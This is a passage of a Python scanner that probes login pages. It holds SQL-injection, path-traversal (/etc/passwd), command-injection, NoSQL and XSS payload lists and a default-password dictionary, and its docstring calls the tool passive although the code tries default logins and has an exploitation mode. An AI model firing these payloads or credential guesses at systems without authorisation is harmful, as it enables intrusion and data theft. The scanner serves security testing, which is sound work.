"""
vuln_scanner.py
================
一个针对登录页面的轻量级漏洞扫描工具。

能力范围（仅做被动 / 低侵入性探测，符合授权安全测试规范）：
  - 安全 HTTP 响应头检查
  - Cookie 安全属性检查（HttpOnly / Secure / SameSite）
  - SSL/TLS 配置检查（HTTPS 站点）
  - 登录表单枚举与字段分析
  - SQL 注入探测（基于错误回显的被动检测）
  - 跨站脚本（XSS）反射点探测
  - 目录 / 敏感文件探测（robots.txt / 备份文件等常见暴露点）

输出：
  - 终端彩色摘要
  - JSON 报告  reports/<host>_<timestamp>.json
  - HTML 报告  reports/<host>_<timestamp>.html

用法：
  python vuln_scanner.py <URL> [--timeout 10] [--no-sql] [--no-xss] [--ua "..."]

⚠️ 法律与伦理声明：
  本工具仅用于授权的安全测试、CTF、教学与自检场景。
  对未取得书面授权的目标进行扫描属于违法行为，使用者须自行承担全部责任。
"""

from __future__ import annotations

import argparse
import datetime
import json
import os
import re
import socket
import ssl
import sys
import threading
import time
from dataclasses import dataclass, field, asdict
from typing import Optional
from urllib.parse import urljoin, urlparse, quote

import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init as colorama_init

# 在 Windows 终端强制 UTF-8 输出，避免中文乱码
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

colorama_init(autoreset=True)

# ----------------------------------------------------------------------
# 数据结构
# ----------------------------------------------------------------------

SEVERITY_ORDER = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
SEVERITY_COLOR = {
    "info": Fore.CYAN,
    "low": Fore.BLUE,
    "medium": Fore.YELLOW,
    "high": Fore.RED,
    "critical": Fore.MAGENTA + Style.BRIGHT,
}


@dataclass
class Finding:
    title: str
    severity: str  # info / low / medium / high / critical
    description: str
    evidence: str = ""
    recommendation: str = ""
    url: str = ""


@dataclass
class ExploitEvidence:
    """漏洞利用 / 后台取证证据。"""
    technique: str          # 利用技术，如 "SQL 注入 UNION 提取"、"默认凭据登录后台"
    target: str             # 目标入口（表单/URL）
    success: bool = False
    data: dict = field(default_factory=dict)   # 提取到的键值信息（version / database / users…）
    excerpt: str = ""       # 关键内容摘录（已截断、已脱敏）
    url: str = ""


@dataclass
class ScanReport:
    target: str
    started_at: str
    finished_at: str = ""
    findings: list[Finding] = field(default_factory=list)
    exploits: list[ExploitEvidence] = field(default_factory=list)
    summary: dict = field(default_factory=dict)

    def add(self, finding: Finding) -> None:
        self.findings.append(finding)

    @property
    def by_severity(self) -> dict:
        out = {k: 0 for k in SEVERITY_ORDER}
        for f in self.findings:
            out[f.severity] = out.get(f.severity, 0) + 1
        return out

    def sorted_findings(self) -> list[Finding]:
        return sorted(self.findings, key=lambda f: -SEVERITY_ORDER.get(f.severity, 0))


# ----------------------------------------------------------------------
# 扫描器核心
# ----------------------------------------------------------------------

DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) VulnScanner/1.0 (authorized-security-test)"

# 常见 SQL 错误回显特征
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*?MySQL",
    r"Warning.*?\Wmysqli?_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your (MySQL|MariaDB) server version",
    r"PostgreSQL.*?ERROR",
    r"ORA-\d{5}",
    r"Microsoft SQL Server.*?Driver",
    r"ODBC SQL Server Driver",
    r"Unclosed quotation mark after the character string",
    r"SQLite3?::query",
    r"sqlite_query\(\)",
    r"PG::SyntaxError",
    r"Incorrect syntax near",
    r"syntax error at or near",
    r"Unclosed quotation mark",
    r"com\.mysql\.jdbc",
    r"org\.postgresql",
    r"System\.Data\.SqlClient\.SqlException",
    r"You have an error in your SQL syntax",
]
SQL_ERROR_RE = re.compile("|".join(SQL_ERROR_PATTERNS), re.IGNORECASE)

# 错误回显型 SQL 注入载荷（覆盖多种数据库与闭合方式）
SQL_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' -- -",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "1' OR '1'='1' -- -",
    "admin'--",
    "admin' OR '1'='1'-- -",
    "') OR ('1'='1",
    "')) OR (('1'='1",
    "\" OR \"\"=\"",
    "1; SELECT 1 --",
    "' UNION SELECT NULL,NULL,NULL -- -",
    "' AND 1=CONVERT(int,@@version) --",
    "' AND 1=(SELECT @@version) --",
]

# 基于时间盲注的载荷（前端 payload 探测响应延迟，DBMS 分支）
SQL_TIME_PAYLOADS = [
    ("' AND SLEEP(5) -- -", "MySQL SLEEP"),
    ("' AND IF(1=1,SLEEP(5),0) -- -", "MySQL IF/SLEEP"),
    ("'; WAITFOR DELAY '0:0:5' --", "MSSQL WAITFOR"),
    ("'; SELECT pg_sleep(5) --", "PostgreSQL pg_sleep"),
    ("' OR 1=1; SELECT pg_sleep(5) --", "PostgreSQL pg_sleep(OR)"),
]
# 时间盲注阈值（秒）：响应超过基准 + 该值即判定为疑似
SQL_TIME_THRESHOLD = 4.0

# 目录遍历 / 路径穿越载荷
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "/etc/passwd",
    "C:\\windows\\win.ini",
    "file:///etc/passwd",
    "....\\\\....\\\\....\\\\windows\\\\win.ini",
]

# 命令注入载荷（时间盲注探测：探测串触发延迟即疑似）
CMD_TIME_PAYLOADS = [
    ("; sleep 5 ;", "Unix sleep"),
    ("| timeout 5 ping 127.0.0.1", "Unix ping"),
    ("& timeout 5 ping 127.0.0.1", "Unix ping(&)"),
    ("&& ping -n 5 127.0.0.1", "Windows ping"),
    ("`timeout 5 ping 127.0.0.1`", "Backtick exec"),
    ("$(timeout 5 ping 127.0.0.1)", "Dollar exec"),
    ("| ping -n 5 127.0.0.1 #", "Windows ping(#)"),
]

# 布尔盲注：提交“恒真”与“恒假”载荷，比对响应差异
SQL_BOOL_PAYLOADS = [
    # (true_payload, false_payload, quote_char)
    ("' OR '1'='1", "' OR '1'='2", "'"),
    ("1' OR '1'='1' -- -", "1' OR '1'='2' -- -", "'"),
    ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2", "\""),
    ("1) OR (1=1", "1) OR (1=2", ")"),
    ("' OR 1=1 -- -", "' AND 1=2 -- -", "'"),
]
# 布尔差异阈值：响应正文长度相对差异超过该比例即判疑似
SQL_BOOL_RATIO = 0.15

# LDAP / XPath / NoSQL 错误回显特征
LDAP_ERROR_PATTERNS = [
    r"LDAPException",
    r"javax\.naming\.ldap",
    r"Invalid syntax for filter",
    r"Protocol error occurred",
    r"Data truncation",
]
XPATH_ERROR_PATTERNS = [
    r"XPath error",
    r"Invalid predicate",
    r"xml.*?XPath",
    r"xmlXPathEval",
]
NOSQL_ERROR_PATTERNS = [
    r"MongoError",
    r"MongoDB.*?error",
    r"SyntaxError.*?expected",
]
LDAP_RE = re.compile("|".join(LDAP_ERROR_PATTERNS), re.IGNORECASE)
XPATH_RE = re.compile("|".join(XPATH_ERROR_PATTERNS), re.IGNORECASE)
NOSQL_RE = re.compile("|".join(NOSQL_ERROR_PATTERNS), re.IGNORECASE)

# LDAP / NoSQL 注入探测载荷
LDAP_PAYLOADS = ["*", ")(uid=*))(|(uid=*", "admin)(&(|(uid=*", ")(|(password=*)"]
NOSQL_PAYLOADS = [
    '{"$ne": null}',
    '{"$gt": ""}',
    "true, $where: '1==1'",
    "'; return true; var a='a",
]

# CRLF / HTTP 头注入载荷
CRLF_PAYLOADS = [
    "probe\r\nX-Header: injected",
    "probe\nX-Header: injected",
    "%0d%0aX-Header: injected",
    "probe%0d%0aSet-Cookie: hijack=1",
]

# 默认 / 弱口令字典（用于登录表单凭据探测）
DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("admin", "Password1"),
    ("root", "root"), ("root", "toor"), ("root", "123456"),
    ("test", "test"), ("user", "user"), ("guest", "guest"),
    ("administrator", "administrator"), ("admin", ""),
]

# 用户名枚举探测载荷（响应差异判断用户是否存在）
USER_ENUM_PROBES = ["validuser_probe_xyz", "admin", "root"]

# XSS 探测载荷（无实际攻击行为，仅探测是否原样回显 / 编码缺失）
XSS_PROBES = [
    '<scrxsstest>',
    '"><xssprobe>',
    "<svg/onxss=probe>",
    "javascript:probe//",
    "<img src=x onerror=probe>",
    "\"><img src=x onerror=probe>",
    "<scr<x>ipt>probe</scr</x>ipt>",
    "'\"><xssp1>",
    "<body onload=probe>",
    "\"><svg/onload=probe>",
    "<details/open/ontoggle=probe>",
    "javascript:probe%0a//",
    "<iframe src=javascript:probe>",
    "%3Cscrxsstest%3E",
]
XSS_REFLECT_RE = re.compile(r"(scrxsstest|xssprobe|onxss|xssp1|onload=probe|ontoggle=probe|probe)", re.IGNORECASE)

# 常见暴露端点 / 备份文件 / 敏感配置
COMMON_PATHS = [
    "robots.txt",
    ".git/config",
    ".git/HEAD",
    ".env",
    ".env.bak",
    "backup.zip",
    "backup.tar.gz",
    "backup.sql",
    "db.sql",
    "dump.sql",
    ".svn/entries",
    ".DS_Store",
    "phpinfo.php",
    "info.php",
    "test.php",
    "admin",
    "admin.php",
    "administrator",
    "wp-admin",
    "wp-login.php",
    "wp-config.php.bak",
    "config.php.bak",
    "config.php",
    "web.config.bak",
    "web.config",
    "server-status",
    "server-info",
    ".htaccess",
    ".htpasswd",
    "phpmyadmin",
    "manager/html",
    "console",
    "swagger-ui.html",
    "/.well-known/security.txt",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": ("medium", "缺少 HSTS 头，站点可能遭受 SSL 降级/中间人攻击"),
    "X-Frame-Options": ("medium", "缺少 X-Frame-Options 头，可能遭受点击劫持"),
    "X-Content-Type-Options": ("low", "缺少 X-Content-Type-Options 头，MIME 嗅探可能被滥用"),
    "Content-Security-Policy": ("medium", "缺少 CSP 头，难以防御 XSS / 数据注入"),
    "Referrer-Policy": ("low", "缺少 Referrer-Policy 头，可能泄露来源信息"),
    "Permissions-Policy": ("low", "缺少 Permissions-Policy 头，浏览器特性未受约束"),
    "X-XSS-Protection": ("low", "缺少 X-XSS-Protection 头（旧版浏览器过滤未启用）"),
    "Cross-Origin-Opener-Policy": ("low", "缺少 COOP 头，跨源隔离未启用"),
    "Cross-Origin-Resource-Policy": ("low", "缺少 CORP 头，跨源资源加载未受约束"),
}


class VulnScanner:
    def __init__(self, url: str, timeout: int = 10, ua: str = DEFAULT_UA,
                 do_sql: bool = True, do_xss: bool = True, do_paths: bool = True,
                 do_creds: bool = True, do_exploit: bool = False,
                 crawl_depth: int = 0, crawl_max_pages: int = 1,
                 auth: Optional[dict] = None, cookie: Optional[str] = None,
                 do_ssti: bool = True, do_ssrf: bool = True,
                 do_redirect: bool = True, do_upload: bool = True,
                 on_log=None, cancel=None):
        self.url = url if url.startswith("http") else "http://" + url
        parsed = urlparse(self.url)
        self.host = parsed.hostname or ""
        self.timeout = timeout
        self.do_sql = do_sql
        self.do_xss = do_xss
        self.do_paths = do_paths
        self.do_creds = do_creds
        self.do_exploit = do_exploit
        self.crawl_depth = crawl_depth
        self.crawl_max_pages = max(1, crawl_max_pages)
        self.auth = auth            # {"login_url","user_field","pwd_field","user","password"}
        self.cookie = cookie        # 原始 Cookie 字符串
        self.do_ssti = do_ssti
        self.do_ssrf = do_ssrf
        self.do_redirect = do_redirect
        self.do_upload = do_upload
        self.on_log = on_log or (lambda msg: None)
        self.cancel = cancel or (lambda: False)
        # 已确认的可利用向量（供渗透取证模块复用）
        self.confirmed_sqli: list = []      # [(form, field)]
        self.confirmed_param_sqli: list = []  # [(base_url, param, qs)]
        self.confirmed_creds: list = []     # [(form, user_field, pwd_field, user, pwd)]
        self.scanned_urls: set = set()      # 去重已扫描 URL
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": ua, "Accept": "*/*"})
        if cookie:
            self.session.headers.update({"Cookie": cookie})
        self.report = ScanReport(
            target=self.url,
            started_at=datetime.datetime.now().isoformat(timespec="seconds"),
        )

    # -- 工具方法 -------------------------------------------------------

    def _log(self, msg: str) -> None:
        try:
            self.on_log(msg)
        except Exception:
            pass

    def _cancelled(self) -> bool:
        try:
            return bool(self.cancel())
        except Exception:
            return False

    def _get(self, url: str, **kw) -> Optional[requests.Response]:
        try:
            return self.session.get(url, timeout=self.timeout, allow_redirects=True, **kw)
        except requests.RequestException as e:
            return None

    def _post(self, url: str, data, **kw) -> Optional[requests.Response]:
        try:
            return self.session.post(url, data=data, timeout=self.timeout, allow_redirects=True, **kw)
        except requests.RequestException:
            return None

    # -- 主流程 ---------------------------------------------------------

    def _authenticate(self) -> None:
        """认证：自动登录或使用粘贴的 Cookie，使后续请求携带会话。"""
        if self.cookie:
            self._log("[*] 使用提供的 Cookie 进行认证后扫描…")
            return
        if not self.auth:
            return
        a = self.auth
        self._log(f"[*] 登录 {a.get('login_url')} 以获取会话…")
        data = {a.get("user_field", "username"): a.get("user", ""),
                a.get("pwd_field", "password"): a.get("password", "")}
        resp = self._post(a["login_url"], data=data)
        if resp is None:
            # 可能登录接口是 GET
            resp = self._get(a["login_url"], params=data)
        if resp is None:
            self._log("[!] 登录请求失败，将以未认证状态继续。")
            return
        if self.session.cookies:
            self._log(f"[*] 登录完成，获得会话 Cookie：{', '.join(c.name for c in self.session.cookies)}")
        else:
            self._log("[*] 登录请求已发送，但未获得 Cookie（可能凭据无效或为无状态接口）。")

    def crawl(self, start_resp: requests.Response) -> list:
        """BFS 爬取同源页面，返回 [(url, resp, forms)]。深度/页数受配置限制。"""
        results = []
        visited: set = set()
        queue = [(self.url, 0)]
        visited.add(self._norm_url(self.url))
        while queue and len(results) < self.crawl_max_pages:
            if self._cancelled():
                break
            url, depth = queue.pop(0)
            resp = start_resp if url == self.url and start_resp is not None else self._get(url)
            if resp is None or resp.status_code >= 400:
                continue
            forms = self.parse_forms(resp.text)
            results.append((url, resp, forms))
            if depth >= self.crawl_depth:
                continue
            # 抽取同源链接
            soup = BeautifulSoup(resp.text, "html.parser")
            for a in soup.find_all("a", href=True):
                href = a["href"].split("#")[0].strip()
                if not href or href.startswith(("javascript:", "mailto:", "tel:")):
                    continue
                next_url = urljoin(url, href)
                if urlparse(next_url).hostname != self.host:
                    continue
                nu = self._norm_url(next_url)
                if nu in visited:
                    continue
                visited.add(nu)
                queue.append((next_url, depth + 1))
        return results

    @staticmethod
    def _norm_url(u: str) -> str:
        p = urlparse(u)
        return f"{p.scheme}://{p.netloc}{p.path}"

    def scan_page(self, url: str, resp: requests.Response, forms: list) -> None:
        """对单个页面运行各项检测。"""
        self._log(f"[*] 扫描页面：{url}")
        if forms:
            login_like = any(f.is_login_like for f in forms)
            self.report.add(Finding(
                title="登录表单枚举",
                severity="info",
                description=f"发现 {len(forms)} 个表单。" + (
                    "其中可能包含登录表单。" if login_like else ""),
                url=url,
            ))
        if self.do_sql:
            self.test_sql_injection(forms)
        if self._cancelled():
            return
        if self.do_xss:
            self.test_xss(resp, url)
        if self._cancelled():
            return
        if self.do_sql:
            self.test_param_injection(url)
            self.test_param_sqli(url)
        if self._cancelled():
            return
        if self.do_ssti:
            self.test_ssti(url, forms)
        if self.do_ssrf:
            self.test_ssrf(url)
        if self.do_redirect:
            self.test_open_redirect(url)
        if self.do_upload:
            self.test_file_upload(forms, url)
        if self._cancelled():
            return
        if self.do_creds and forms:
            login_forms = [f for f in forms if f.is_login_like]
            if login_forms:
                self.test_default_creds(forms)

    def run(self) -> ScanReport:
        self._log(f"[*] 目标：{self.url}")
        if self.auth or self.cookie:
            self._authenticate()
        if self._cancelled():
            return self._finish()
        resp = self._get(self.url)
        if resp is None:
            self.report.add(Finding(
                title="目标不可达",
                severity="critical",
                description=f"无法连接到 {self.url}，请检查 URL / 网络 / 是否已获授权。",
                url=self.url,
            ))
            self.report.finished_at = datetime.datetime.now().isoformat(timespec="seconds")
            return self.report

        self.report.add(Finding(
            title="HTTP 基础信息",
            severity="info",
            description=f"状态码 {resp.status_code} | 服务器 {resp.headers.get('Server','未知')} | 内容长度 {len(resp.content)} B",
            url=self.url,
        ))

        self._log("[*] 检查安全响应头…")
        self.check_security_headers(resp)
        self._log("[*] 检查 Cookie 安全属性…")
        self.check_cookies(resp)
        self._log("[*] 检查 TLS/SSL…")
        self.check_tls()
        if self._cancelled():
            return self._finish()

        # 爬取页面（深度 0 = 仅首页）
        pages = self.crawl(resp)
        self._log(f"[*] 爬取完成，共 {len(pages)} 个页面待扫描。")
        if self._cancelled():
            return self._finish()

        if self.do_paths:
            self._log("[*] 探测敏感路径…")
            self.probe_common_paths()

        for url, presp, forms in pages:
            if self._cancelled():
                break
            self.scan_page(url, presp, forms)

        if self.do_exploit:
            self._log("[*] 漏洞利用取证（尝试进入后台 / 提取信息）…")
            self.attempt_exploitation()
        return self._finish()

    def _finish(self) -> ScanReport:
        self.report.finished_at = datetime.datetime.now().isoformat(timespec="seconds")
        self.report.summary = {
            "total_findings": len(self.report.findings),
            "by_severity": self.report.by_severity,
            "exploit_attempts": len(self.report.exploits),
            "exploit_succeeded": sum(1 for e in self.report.exploits if e.success),
        }
        return self.report

    # -- 安全响应头 -----------------------------------------------------

    def check_security_headers(self, resp: requests.Response) -> None:
        lower = {k.lower(): v for k, v in resp.headers.items()}
        for header, (sev, msg) in SECURITY_HEADERS.items():
            if header.lower() not in lower:
                self.report.add(Finding(
                    title=f"缺失安全响应头: {header}",
                    severity=sev,
                    description=msg,
                    recommendation=f"在响应中添加 {header} 头并配置合适策略。",
                    url=self.url,
                ))

    # -- Cookie 安全 ----------------------------------------------------

    def check_cookies(self, resp: requests.Response) -> None:
        for c in self.session.cookies:
            issues = []
            if not c.secure:
                issues.append("缺少 Secure 属性（明文传输风险）")
            if not c.has_nonstandard_attr("HttpOnly") and not c._rest.get("HttpOnly"):
                # requests 的 cookie 行为在不同版本有差异，做一次兜底判断
                pass
            if c.has_nonstandard_attr("HttpOnly"):
                httponly = True
            else:
                httponly = False
            if not httponly and any(c.name.lower() in ("session", "token", "auth", "phpsessid", "jsessionid")
                                   for sub in (c.name.lower(),)):
                issues.append("缺少 HttpOnly 属性（脚本可读取，XSS 风险放大）")
            samesite = c._rest.get("SameSite") if hasattr(c, "_rest") else None
            if not samesite:
                issues.append("缺少 SameSite 属性（CSRF 风险）")
            if issues:
                self.report.add(Finding(
                    title=f"Cookie 安全属性不足: {c.name}",
                    severity="medium",
                    description="；".join(issues),
                    evidence=f"domain={c.domain} path={c.path}",
                    recommendation="为会话 Cookie 设置 Secure、HttpOnly、SameSite=Strict/Lax。",
                    url=self.url,
                ))

    # -- TLS 检查 -------------------------------------------------------

    def check_tls(self) -> None:
        if urlparse(self.url).scheme != "https":
            self.report.add(Finding(
                title="未启用 HTTPS",
                severity="high",
                description="目标登录页使用明文 HTTP，凭据可能被窃听。",
                recommendation="部署 TLS 证书并强制跳转 HTTPS。",
                url=self.url,
            ))
            return
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((self.host, 443), timeout=self.timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.host) as ssock:
                    cert = ssock.getpeercert()
                    version = ssock.version()
            if version in ("TLSv1", "TLSv1.1"):
                self.report.add(Finding(
                    title="使用过时的 TLS 版本",
                    severity="medium",
                    description=f"协商版本为 {version}，已不安全。",
                    recommendation="禁用 TLSv1/1.1，仅启用 TLSv1.2+。",
                    url=self.url,
                ))
            not_after = cert.get("notAfter")
            try:
                expire = datetime.datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                days_left = (expire - datetime.datetime.now(datetime.UTC)).days
                if days_left < 30:
                    self.report.add(Finding(
                        title="证书即将过期或已过期",
                        severity="high" if days_left < 0 else "medium",
                        description=f"证书剩余 {days_left} 天到期（{not_after}）。",
                        recommendation="及时续期 TLS 证书。",
                        url=self.url,
                    ))
            except Exception:
                pass
        except Exception as e:
            self.report.add(Finding(
                title="TLS 握手失败",
                severity="high",
                description=f"无法建立 TLS 连接：{e}",
                recommendation="检查证书链 / 端口 / 域名配置。",
                url=self.url,
            ))

    # -- 表单枚举 -------------------------------------------------------

    def parse_forms(self, html: str) -> list["FormInfo"]:
        soup = BeautifulSoup(html, "html.parser")
        forms = []
        for i, form in enumerate(soup.find_all("form")):
            action = form.get("action") or ""
            method = (form.get("method") or "get").lower()
            action_url = urljoin(self.url, action)
            fields = [(inp.get("name") or "", inp.get("type", "text"))
                      for inp in form.find_all(["input", "textarea", "select"])]
            is_login = any(
                n.lower() in ("user", "username", "user_name", "account", "login",
                              "email", "passwd", "password", "pass", "pwd")
                for n, _ in fields
            )
            forms.append(FormInfo(index=i, action=action_url, method=method,
                                  fields=fields, is_login_like=is_login))
        return forms

    # -- SQL 注入 -------------------------------------------------------

    def _send_form(self, form: "FormInfo", payload: str) -> Optional[requests.Response]:
        """将 payload 注入到登录表单的每个可注入字段并提交。"""
        data = {}
        for name, ftype in form.fields:
            if not name:
                continue
            data[name] = payload if ftype in ("password", "passwd", "text", "",
                                              "email", "search", "") else "test"
        if form.method == "post":
            return self._post(form.action, data=data)
        return self._get(form.action, params=data)

    def _injectable_field(self, form: "FormInfo") -> Optional[str]:
        """挑选最适合注入的文本字段（用户名/搜索类优先）。"""
        preferred = ("user", "username", "user_name", "account", "login",
                     "email", "name", "q", "search", "id", "key")
        for name, _ in form.fields:
            if name and name.lower() in preferred:
                return name
        for name, ftype in form.fields:
            if name and ftype in ("text", "email", "search", ""):
                return name
        for name, _ in form.fields:
            if name:
                return name
        return None

    def _send_form_single(self, form: "FormInfo", field: str, payload: str,
                          extra: dict | None = None) -> Optional[requests.Response]:
        """仅向指定字段注入 payload，其余字段填入中性值。"""
        data = {}
        for name, ftype in form.fields:
            if not name:
                continue
            if name == field:
                data[name] = payload
            else:
                data[name] = "test" if ftype != "password" else "Pw1!aaaa"
        if extra:
            data.update(extra)
        if form.method == "post":
            return self._post(form.action, data=data)
        return self._get(form.action, params=data)

    def test_sql_injection(self, forms: list["FormInfo"]) -> None:
        login_forms = [f for f in forms if f.is_login_like]
        if not login_forms:
            login_forms = forms  # 没有明确登录表单时，对所有表单探测
        for form in login_forms:
            if self._cancelled():
                return
            # 1) 错误回显型（SQL / LDAP / XPath / NoSQL）
            for payload in SQL_PAYLOADS + LDAP_PAYLOADS + NOSQL_PAYLOADS:
                resp = self._send_form(form, payload)
                if resp is None:
                    continue
                m = SQL_ERROR_RE.search(resp.text)
                if m:
                    field = self._injectable_field(form)
                    self.report.add(Finding(
                        title="疑似 SQL 注入（错误回显）",
                        severity="high",
                        description=f"提交 {payload!r} 后响应中包含数据库错误特征：{m.group(0)[:60]}",
                        evidence=f"表单 #{form.index} action={form.action} method={form.method}",
                        recommendation="使用参数化查询 / ORM，禁止拼接 SQL，统一错误处理。",
                        url=form.action,
                    ))
                    if field:
                        self.confirmed_sqli.append((form, field))
                    break
                if LDAP_RE.search(resp.text):
                    self.report.add(Finding(
                        title="疑似 LDAP 注入",
                        severity="high",
                        description=f"提交 {payload!r} 后响应中包含 LDAP 错误特征。",
                        evidence=f"表单 #{form.index} action={form.action}",
                        recommendation="对 LDAP 查询输入做转义与白名单校验。",
                        url=form.action,
                    ))
                    break
                if XPATH_RE.search(resp.text):
                    self.report.add(Finding(
                        title="疑似 XPath 注入",
                        severity="high",
                        description=f"提交 {payload!r} 后响应中包含 XPath 错误特征。",
                        evidence=f"表单 #{form.index} action={form.action}",
                        recommendation="使用参数化 XPath 查询，转义特殊字符。",
                        url=form.action,
                    ))
                    break
                if NOSQL_RE.search(resp.text):
                    self.report.add(Finding(
                        title="疑似 NoSQL 注入",
                        severity="high",
                        description=f"提交 {payload!r} 后响应中包含 NoSQL 错误特征。",
                        evidence=f"表单 #{form.index} action={form.action}",
                        recommendation="对 NoSQL 查询做输入校验，禁用 $where 等运算符注入。",
                        url=form.action,
                    ))
                    break
            # 2) 时间盲注型（即使无错误回显也可能存在）
            if not self._cancelled():
                self._test_time_based_sqli(form)
            # 3) 布尔盲注型（恒真 vs 恒假的响应差异）
            if not self._cancelled():
                self._test_bool_based_sqli(form)

    def _test_bool_based_sqli(self, form: "FormInfo") -> None:
        # 取一个“恒假”基准响应与“恒真”响应做长度差异比对
        for true_p, false_p, quote in SQL_BOOL_PAYLOADS:
            r_false = self._send_form(form, false_p)
            r_true = self._send_form(form, true_p)
            if r_false is None or r_true is None:
                continue
            lf, lt = len(r_false.text), len(r_true.text)
            base = max(lf, lt, 1)
            if abs(lt - lf) / base >= SQL_BOOL_RATIO and lt > lf:
                field = self._injectable_field(form)
                self.report.add(Finding(
                    title="疑似 SQL 注入（布尔盲注）",
                    severity="high",
                    description=f"恒真载荷 {true_p!r} 与恒假载荷 {false_p!r} 响应长度差异显著"
                                f"（真 {lt} B / 假 {lf} B），疑似存在布尔注入。",
                    evidence=f"表单 #{form.index} action={form.action}",
                    recommendation="使用参数化查询，避免根据用户输入拼接查询条件。",
                    url=form.action,
                ))
                if field:
                    self.confirmed_sqli.append((form, field))
                break

    def _test_time_based_sqli(self, form: "FormInfo") -> None:
        # 先测基准响应时间
        baseline_resp = self._send_form(form, "benign_probe_value")
        if baseline_resp is None:
            return
        baseline = baseline_resp.elapsed.total_seconds()
        for payload, label in SQL_TIME_PAYLOADS:
            resp = self._send_form(form, payload)
            if resp is None:
                continue
            elapsed = resp.elapsed.total_seconds()
            if elapsed >= baseline + SQL_TIME_THRESHOLD:
                field = self._injectable_field(form)
                self.report.add(Finding(
                    title="疑似 SQL 注入（时间盲注）",
                    severity="high",
                    description=f"提交 {payload!r}（{label}）后响应耗时 {elapsed:.1f}s，"
                                f"基准 {baseline:.1f}s，差值 {elapsed-baseline:.1f}s 超过阈值。",
                    evidence=f"表单 #{form.index} action={form.action}",
                    recommendation="使用参数化查询，对输入做白名单校验，禁止拼接。",
                    url=form.action,
                ))
                if field:
                    self.confirmed_sqli.append((form, field))
                break

    # -- 目录遍历 / 命令注入 -------------------------------------------

    def _param_payload(self, qs: dict, key: str, payload: str, base: str):
        """构造注入到指定 GET 参数的请求。"""
        params = {k: (payload if k == key else (v[0] if v else ""))
                  for k, v in qs.items()}
        return self._get(base, params=params)

    def test_param_sqli(self, url: str = "") -> None:
        """对 URL 上的每个 GET 参数做 SQL 注入探测（错误回显 / 布尔盲注 / 时间盲注）。"""
        target = url or self.url
        parsed = urlparse(target)
        if not parsed.query:
            return
        from urllib.parse import parse_qs
        qs = parse_qs(parsed.query, keep_blank_values=True)
        base = target.split("?")[0]
        baseline_resp = self._get(target)
        baseline_t = baseline_resp.elapsed.total_seconds() if baseline_resp else 0.0
        baseline_len = len(baseline_resp.text) if baseline_resp else 0

        for key in qs:
            if self._cancelled():
                return
            # 1) 错误回显
            resp = self._param_payload(qs, key, "'", base)
            if resp and SQL_ERROR_RE.search(resp.text):
                m = SQL_ERROR_RE.search(resp.text)
                self.report.add(Finding(
                    title="疑似 SQL 注入（GET 参数·错误回显）",
                    severity="high",
                    description=f"参数 {key} 注入单引号后响应包含数据库错误特征：{m.group(0)[:60]}",
                    evidence=resp.url,
                    recommendation="使用参数化查询 / ORM，禁止拼接 SQL，统一错误处理。",
                    url=resp.url,
                ))
                self.confirmed_param_sqli.append((base, key, qs))
                continue
            # 2) 布尔盲注（恒真 vs 恒假）
            r_true = self._param_payload(qs, key, "1 AND 1=1", base)
            r_false = self._param_payload(qs, key, "1 AND 1=2", base)
            if r_true and r_false:
                lt, lf = len(r_true.text), len(r_false.text)
                base_len = max(lt, lf, baseline_len, 1)
                if lt > lf and (lt - lf) / base_len >= SQL_BOOL_RATIO and \
                   abs(lt - baseline_len) < base_len * 0.3:
                    self.report.add(Finding(
                        title="疑似 SQL 注入（GET 参数·布尔盲注）",
                        severity="high",
                        description=f"参数 {key} 恒真/恒假载荷响应差异显著（真 {lt} / 假 {lf}）。",
                        evidence=r_false.url,
                        recommendation="使用参数化查询，避免根据用户输入拼接查询条件。",
                        url=r_true.url,
                    ))
                    self.confirmed_param_sqli.append((base, key, qs))
                    continue
            # 3) 时间盲注
            for payload, label in SQL_TIME_PAYLOADS:
                resp = self._param_payload(qs, key, payload, base)
                if resp is None:
                    continue
                if resp.elapsed.total_seconds() >= baseline_t + SQL_TIME_THRESHOLD:
                    self.report.add(Finding(
                        title="疑似 SQL 注入（GET 参数·时间盲注）",
                        severity="high",
                        description=f"参数 {key} 注入 {payload!r}（{label}）后响应耗时 "
                                    f"{resp.elapsed.total_seconds():.1f}s（基准 {baseline_t:.1f}s）。",
                        evidence=resp.url,
                        recommendation="使用参数化查询，对输入做白名单校验，禁止拼接。",
                        url=resp.url,
                    ))
                    self.confirmed_param_sqli.append((base, key, qs))
                    break

    def test_param_injection(self, url: str = "") -> None:
        """对 URL 上的每个参数做目录遍历与命令注入（时间盲注）探测。"""
        target = url or self.url
        parsed = urlparse(target)
        if not parsed.query:
            return
        from urllib.parse import parse_qs
        qs = parse_qs(parsed.query, keep_blank_values=True)
        base = target.split("?")[0]
        # 基准
        baseline_resp = self._get(target)
        baseline = baseline_resp.elapsed.total_seconds() if baseline_resp else 0.0

        for key in qs:
            # 目录遍历
            for payload in TRAVERSAL_PAYLOADS:
                params = {k: (payload if k == key else (v[0] if v else ""))
                          for k, v in qs.items()}
                resp = self._get(base, params=params)
                if resp is None:
                    continue
                if ("root:x:" in resp.text and "bin/bash" in resp.text) or \
                   ("[fonts]" in resp.text) or ("[extensions]" in resp.text):
                    self.report.add(Finding(
                        title="疑似目录遍历 / 任意文件读取",
                        severity="critical",
